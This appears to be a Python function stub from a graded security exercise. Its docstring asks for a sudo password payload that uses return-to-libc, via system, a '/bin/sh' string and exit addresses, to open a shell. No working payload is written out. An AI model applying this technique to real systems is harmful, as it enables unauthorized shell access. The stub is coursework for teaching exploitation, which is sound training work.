def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to open a shell using the return-to-libc
    technique and exit with our new exit code. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Use `addresses.SYSTEM` to get the address of the `system` function
    2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string
    3. Use `addresses.EXIT` to get the address of the `exit` function

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
